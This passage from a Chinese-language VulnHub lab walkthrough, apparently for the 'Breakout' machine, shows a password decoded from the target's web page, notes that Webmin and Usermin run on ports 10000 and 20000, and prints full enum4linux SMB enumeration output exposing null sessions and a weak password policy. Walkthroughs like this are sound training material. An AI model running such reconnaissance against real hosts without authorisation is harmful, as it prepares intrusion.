+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>--&gt;</span></span></code></pre></div><p>解码后结果为<code>.2uqPEfj3D&lt;P'a-3</code></p>
+<h3 id="14-1000020000端口">1.4 10000/20000端口<a class="anchor" href="#14-1000020000%e7%ab%af%e5%8f%a3">#</a></h3>
+<p>10000为Webmin，而20000为Usermin</p>
+<h3 id="15-smb服务探测-139445端口">1.5 smb服务探测 139、445端口<a class="anchor" href="#15-smb%e6%9c%8d%e5%8a%a1%e6%8e%a2%e6%b5%8b-139445%e7%ab%af%e5%8f%a3">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/vulnhub/vulnhub_em_br<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  2</span><span>└─$ enum4linux 192.168.242.94   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  3</span><span>Starting enum4linux v0.9.1 <span style="color:#ff7b72;font-weight:bold">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span style="color:#ff7b72;font-weight:bold">)</span> on Thu Jan <span style="color:#a5d6ff">22</span> 03:23:01 <span style="color:#79c0ff">2026</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  5</span><span> <span style="color:#ff7b72;font-weight:bold">=========================================(</span> Target Information <span style="color:#ff7b72;font-weight:bold">)=========================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  6</span><span>                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  7</span><span>Target ........... 192.168.242.94                                                                                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  8</span><span>RID Range ........ 500-550,1000-1050
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">  9</span><span>Username ......... <span style="color:#a5d6ff">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 10</span><span>Password ......... <span style="color:#a5d6ff">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 11</span><span>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, <span style="color:#79c0ff">none</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 13</span><span> <span style="color:#ff7b72;font-weight:bold">===========================(</span> Enumerating Workgroup/Domain on 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">)===========================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 14</span><span>                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 15</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Got domain/workgroup name: <span style="color:#79c0ff">WORKGROUP</span>                                                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 16</span><span> <span style="color:#ff7b72;font-weight:bold">===============================(</span> Nbtstat Information <span style="color:#ff7b72">for</span> 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">)===============================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 17</span><span>                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 18</span><span>Looking up status of 192.168.242.94                                                                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 19</span><span>        BREAKOUT        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 20</span><span>        BREAKOUT        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 21</span><span>        BREAKOUT        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 22</span><span>        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 23</span><span>        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 24</span><span>        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 25</span><span>        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 27</span><span>        MAC <span style="color:#79c0ff">Address</span> <span style="color:#ff7b72;font-weight:bold">=</span> 00-00-00-00-00-00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 28</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 29</span><span> <span style="color:#ff7b72;font-weight:bold">==================================(</span> Session Check on 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">)==================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 30</span><span>                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 31</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Server 192.168.242.94 allows sessions using username <span style="color:#a5d6ff">&#39;&#39;</span>, password <span style="color:#a5d6ff">&#39;&#39;</span>                                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 32</span><span> <span style="color:#ff7b72;font-weight:bold">===============================(</span> Getting domain SID <span style="color:#ff7b72">for</span> 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">)===============================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 33</span><span>                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 34</span><span>Domain Name: WORKGROUP                                                                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 35</span><span>Domain Sid: <span style="color:#ff7b72;font-weight:bold">(</span>NULL SID<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 36</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 37</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Can<span style="color:#a5d6ff">&#39;t determine if host is part of domain or part of a workgroup                                                                                     
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 38</span><span><span style="color:#a5d6ff"> ==================================( OS information on 192.168.242.94 )==================================
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 39</span><span><span style="color:#a5d6ff">                                                                   
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 40</span><span><span style="color:#a5d6ff">[E] Can&#39;</span>t get OS info with smbclient                                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 41</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Got OS info <span style="color:#ff7b72">for</span> 192.168.242.94 from srvinfo:                                                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 42</span><span>        BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian                                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 43</span><span>        platform_id     :       <span style="color:#a5d6ff">500</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 44</span><span>        os version      :       6.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 45</span><span>        server type     :       <span style="color:#79c0ff">0x809a03</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 46</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 47</span><span> <span style="color:#ff7b72;font-weight:bold">======================================(</span> Users on 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">)======================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 48</span><span>                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 49</span><span>Use of uninitialized value <span style="color:#79c0ff">$users</span> in print at ./enum4linux.pl line 972.                                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 50</span><span>Use of uninitialized value <span style="color:#79c0ff">$users</span> in pattern match <span style="color:#ff7b72;font-weight:bold">(</span>m//<span style="color:#ff7b72;font-weight:bold">)</span> at ./enum4linux.pl line 975.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 51</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 52</span><span>Use of uninitialized value <span style="color:#79c0ff">$users</span> in print at ./enum4linux.pl line 986.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 53</span><span>Use of uninitialized value <span style="color:#79c0ff">$users</span> in pattern match <span style="color:#ff7b72;font-weight:bold">(</span>m//<span style="color:#ff7b72;font-weight:bold">)</span> at ./enum4linux.pl line 988.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 54</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 55</span><span> <span style="color:#ff7b72;font-weight:bold">================================(</span> Share Enumeration on 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">)================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 56</span><span>                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 57</span><span>smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 58</span><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 59</span><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 60</span><span>        print$          Disk      Printer Drivers
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 61</span><span>        IPC$            IPC       IPC Service <span style="color:#ff7b72;font-weight:bold">(</span>Samba 4.13.5-Debian<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 62</span><span>Reconnecting with SMB1 <span style="color:#ff7b72">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 63</span><span>Protocol negotiation to server 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#ff7b72">for</span> a protocol between LANMAN1 and NT1<span style="color:#ff7b72;font-weight:bold">)</span> failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 64</span><span>Unable to connect with SMB1 -- no workgroup available
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 65</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 66</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Attempting to map shares on 192.168.242.94                                                                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 67</span><span>//192.168.242.94/print$ Mapping: DENIED Listing: N/A Writing: N/A                                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 68</span><span><span style="color:#ff7b72;font-weight:bold">[</span>E<span style="color:#ff7b72;font-weight:bold">]</span> Can<span style="color:#a5d6ff">&#39;t understand response:                                                                                                                           
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 69</span><span><span style="color:#a5d6ff">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 70</span><span><span style="color:#a5d6ff">//192.168.242.94/IPC$   Mapping: N/A Listing: N/A Writing: N/A
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 71</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 72</span><span><span style="color:#a5d6ff"> ===========================( Password Policy Information for 192.168.242.94 )===========================
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 73</span><span><span style="color:#a5d6ff">                                                               
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 74</span><span><span style="color:#a5d6ff">Password:                                                                               
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 75</span><span><span style="color:#a5d6ff">[+] Attaching to 192.168.242.94 using a NULL share
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 76</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 77</span><span><span style="color:#a5d6ff">[+] Trying protocol 139/SMB...
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 78</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 79</span><span><span style="color:#a5d6ff">[+] Found domain(s):
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 80</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 81</span><span><span style="color:#a5d6ff">        [+] BREAKOUT
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 82</span><span><span style="color:#a5d6ff">        [+] Builtin
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 83</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 84</span><span><span style="color:#a5d6ff">[+] Password Info for Domain: BREAKOUT
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 85</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 86</span><span><span style="color:#a5d6ff">        [+] Minimum password length: 5
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 87</span><span><span style="color:#a5d6ff">        [+] Password history length: None
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 88</span><span><span style="color:#a5d6ff">        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 89</span><span><span style="color:#a5d6ff">        [+] Password Complexity Flags: 000000
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 90</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 91</span><span><span style="color:#a5d6ff">                [+] Domain Refuse Password Change: 0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 92</span><span><span style="color:#a5d6ff">                [+] Domain Password Store Cleartext: 0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 93</span><span><span style="color:#a5d6ff">                [+] Domain Password Lockout Admins: 0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 94</span><span><span style="color:#a5d6ff">                [+] Domain Password No Clear Change: 0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 95</span><span><span style="color:#a5d6ff">                [+] Domain Password No Anon Change: 0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 96</span><span><span style="color:#a5d6ff">                [+] Domain Password Complex: 0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 97</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 98</span><span><span style="color:#a5d6ff">        [+] Minimum password age: None
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 99</span><span><span style="color:#a5d6ff">        [+] Reset Account Lockout Counter: 30 minutes 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">100</span><span><span style="color:#a5d6ff">        [+] Locked Account Duration: 30 minutes 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">101</span><span><span style="color:#a5d6ff">        [+] Account Lockout Threshold: None
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">102</span><span><span style="color:#a5d6ff">        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">103</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">104</span><span><span style="color:#a5d6ff">[+] Retieved partial password policy with rpcclient:                                                                                        
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">105</span><span><span style="color:#a5d6ff">Password Complexity: Disabled                                                                                                                               
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">106</span><span><span style="color:#a5d6ff">Minimum Password Length: 5
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">107</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">108</span><span><span style="color:#a5d6ff"> ======================================( Groups on 192.168.242.94 )======================================
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">109</span><span><span style="color:#a5d6ff">                                                     
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">110</span><span><span style="color:#a5d6ff">[+] Getting builtin groups:                                                                                                                        
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">111</span><span><span style="color:#a5d6ff">[+]  Getting builtin group memberships:                                                                                                   
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">112</span><span><span style="color:#a5d6ff">[+]  Getting local groups:                                                                                                                          
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">113</span><span><span style="color:#a5d6ff">[+]  Getting local group memberships:                                                                                                           
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">114</span><span><span style="color:#a5d6ff">[+]  Getting domain groups:                                                                                                                    
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">115</span><span><span style="color:#a5d6ff">[+]  Getting domain group memberships:                                                                                                                      
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">116</span><span><span style="color:#a5d6ff"> =================( Users on 192.168.242.94 via RID cycling (RIDS: 500-550,1000-1050) )=================
